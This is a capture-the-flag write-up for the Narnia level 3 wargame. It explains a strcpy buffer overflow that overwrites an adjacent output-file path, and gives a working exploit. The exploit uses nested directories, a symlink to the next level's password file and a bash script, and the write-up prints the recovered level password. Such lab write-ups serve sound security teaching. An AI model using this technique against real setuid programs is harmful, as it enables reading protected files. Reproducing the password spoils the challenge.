# narnia3

`/narnia/narnia3` can be exploited by a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) attack.

## Aim

When run, redirect program output from the default `/dev/null` device, to somewhere we can read later.

## Analysis

```c
char ofile[16] = "/dev/null";
char ifile[32];
...
strcpy(ifile, argv[1]);
```

The overflow occurs using our favourite command, `strcpy`. In this case, we can overwrite `ofile` from the overflow of `ifile`. Remember that local variables are added to the **top** of the stack **in the order they are declared**.

| address | frame | stack   |
| ------- | ----- | ------- |
| low     | main  | `ifile` |
| high    | main  | `ofile` |


## Exploitation
### Design

Essentially this means we can overflow `ifile` to change `ofile`, by passing one long argument to the program.

Unfortunately, strings in C are null byte (`\0`, `0x00`) terminated - the same terminator that bash uses to mark the end of command line arguments. The upshot is that something like this:

```bash
narnia3@narnia:~$ /narnia/narnia3 $(printf "/etc/narnia_pass/narnia4\x00\x00\x00\x00\x00\x00\x00\x00/home/narnia3/out")
error opening rnia3/out
```
will not work, as bash strips out any null bytes it finds before passing input to the program.

Fortunately, we have full access to the filesystem!

```bash
mkdir /home/narnia3/narnianarnianarnia # This path is now 32 bytes long
mkdir /home/narnia3/narnianarnianarnia/home
mkdir /home/narnia3/narnianarnianarnia/home/narnia3
```

This path will be handled by `narnia3` in the following way:

```bash
# Memory
## Expected
/home/narnia3/short/path        /dev/null
|32 byte ifile --------------->|
                                |16 byte ofile>|
ifile="/home/narnia3/path"
ofile="/dev/null"

## Actual (overflow)
/home/narnia3/narnianarnianarnia/home/narnia3/
|48 byte ifile ------------------------------->|
                                |16 byte ofile>|
ifile="/home/narnia3/narnianarnianarnia/home/narnia3/"
ofile="/home/narnia3/"
```

> Note that C reads strnigs from memory until it finds a null byte (`0x00`), at which point it stops. Therefore N bytes of memory can store N - 1 characters.
> This is also the reason in our exploit that `ifile` is read from memory as a 48 byte string, as we overflowed over the terminating `0x00` from when `ifile` was initialised.

We can now create file(s) to exploit this behaviour:

```bash
ln -s /etc/narnia_pass/narnia4 /home/narnia3/narnianarnianarnia/home/narnia3/o
touch /home/narnia3/o
```

Now, when passed as an argument, `ifile` will point to the password file, and the `ofile` will point to an empty file in the home directory.

```bash
narnia3@narnia:~/narnianarnianarnia/home/narnia3$ /narnia/narnia3 /home/narnia3/narnianarnianarnia/home/narnia3/o
copied contents of /home/narnia3/narnianarnianarnia/home/narnia3/o to a safer place... (/home/narnia3/o)
```

We can now just read out the password!

```
narnia3@narnia:~/narnianarnianarnia/home/narnia3$ cat /home/narnia3/o
thaenohtai
▒▒▒▒▒4▒▒▒▒_▒▒}0,narnia3@narnia:
```

> You can read out just the password using `strings /home/narnia3/o`.

### Implementation

As a nice script:

```bash
#!/bin/bash

# Setup filesystem
mkdir /home/narnia3/narnianarnianarnia
mkdir /home/narnia3/narnianarnianarnia/home
mkdir /home/narnia3/narnianarnianarnia/home/narnia3

# Make file objects
ln -s /etc/narnia_pass/narnia4 /home/narnia3/narnianarnianarnia/home/narnia3/o
touch /home/narnia3/o

# Pass exploit argument to program
/narnia/narnia3 /home/narnia3/narnianarnianarnia/home/narnia3/o

# Read password nicely (the output also contains binary output)
strings /home/narnia3/o
```
